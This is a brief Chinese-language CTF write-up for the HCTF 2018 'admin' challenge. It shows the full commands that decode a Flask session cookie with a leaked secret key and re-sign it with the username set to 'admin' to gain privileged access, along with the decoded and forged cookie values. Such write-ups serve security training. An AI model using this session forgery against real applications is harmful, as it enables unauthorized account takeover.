### [HCTF 2018]admin

---

随便注册一个账号

![image-20241011215558037](https://gitee.com/bx33661/image/raw/master/path/image-20241011215558037.png)

```
<!-- you are not admin -->
```

我们发现session，那现在xueyao

在change代码界面找到源代码的github地址,解码：

```python
PS E:\gitcode\flask-session-cookie-manager-1.2.1.1\flask-session-cookie-manager-1.2.1.1> python flask_session_cookie_manager3.py decode -s "ckj123" -c ".eJw9UMuKwjAU_ZXhrl30pQvBhRIndCC3tKSGm41ora251oF2BjXiv09xwPV5nwdsj309tDA_7s5DPYHt6QDzB3zsYQ7WNbfMoFOOPfnyZkV6tzpNsMNOOYqU3LQoywR9HlpZ3slVAUoVo6ZpJjhQWkWjziuXJ9blsZWFUyKNM0OJFc2N3Oo8aq_o1x59FY_sQMk0UL65ZrqZkj6wMp9tJuieibUnU8akqxDdMrEGGfXYQ3OEolrAcwLV0B-3P99cX94TyHEwRnuM1glFaWx1E5EumMymQ9Gy1V9sXcFW5lflV2cyaUD54mV36nZN_XbKL7iplv_IZdeNADDzbDaDCfwOdf86DsIQnn_9ZWzO.ZwkvZA.WqHSn3iY9Y0siqmVfZ69q2NQso8"
{'_fresh': False, '_id': b'f819cc293c51d22e286cf2660ea4e8745de2b744c7569894136c53248f47ddc0279f8d81b0e7407137773f40b4380989a7d1aa862813ae7a75608ecd53f19647', 'csrf_token': b'b94f437a8cb7e86a4daef48de2df4ddd030eab4a', 'image': b'BsUp', 'name': 'kkk666', 'user_id': '11'}
```

编码：

```python
PS E:\gitcode\flask-session-cookie-manager-1.2.1.1\flask-session-cookie-manager-1.2.1.1> python flask_session_cookie_manager3.py encode -s 'ckj123' -t "{'_fresh': False, '_id': b'f819cc293c51d22e286cf2660ea4e8745de2b744c7569894136c53248f47ddc0279f8d81b0e7407137773f40b4380989a7d1aa862813ae7a75608ecd53f19647', 'csrf_token': b'b94f437a8cb7e86a4daef48de2df4ddd030eab4a', 'image': b'BsUp', 'name': 'admin', 'user_id': '11'}"
.eJw9UMuKwjAU_ZXhrl305UZwocQJHcgtlbThZiO178R2wM6gjfjvUxxwfd7nAafmWk8dbJriMtUrOPUVbB7wcYYNaNPeE4VGGOvIZXfN4lnLOMIBB2EoEDzvkGcRutTXPJvJlB5yEaKkdcKsJ6QIFp0TJo20SUPNj0awOEwURZq1dzL7y6K9oTs4dGW4sD3BY0-49pbIdk2yskJ9dgmjOWEHRyoLSZY-ml2kFVqUSw9pA2TlFp4rKKdrc_r5tvX4nkDGeku0w-AQURCHWrYByaMllQ_IOqvll9XmaDVPb8LtL6Rij9Lty64firZ-O6Uj5uXuHxmLYQGgqIZ-hBX8TvX19Rv4Pjz_AJhNbPQ.ZwkwQQ.j5yClHogHshbwpaniLOkHLBE6us
```

访问index界面

![image-20241011220516456](https://gitee.com/bx33661/image/raw/master/path/image-20241011220516456.png)